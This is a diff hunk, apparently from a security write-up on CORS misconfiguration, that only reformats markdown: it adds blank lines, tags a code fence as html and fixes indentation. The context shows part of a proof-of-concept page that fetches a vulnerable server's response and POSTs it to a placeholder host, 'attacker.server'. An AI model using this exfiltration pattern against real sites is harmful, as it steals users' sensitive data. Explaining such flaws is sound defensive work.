@@ -73,8 +73,10 @@ Content-Type: application/xml
 
 [Response Body]
 ```
+
 If response contains sensitive data, Attacker can steal it by `XMLHttpRequest`. A simple PoC to steal response can be like this:
-```
+
+```html
 <html>
     <head></head>
     <body>
@@ -87,7 +89,7 @@ If response contains sensitive data, Attacker can steal it by `XMLHttpRequest`. 
                     xhr2.open("POST", "http://attacker.server", true);
                     xhr2.send(xhr.responseText);
                 }
-	    };
+            };
             // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
             xhr.open("GET", "http://victim.site", true);
             xhr.send();
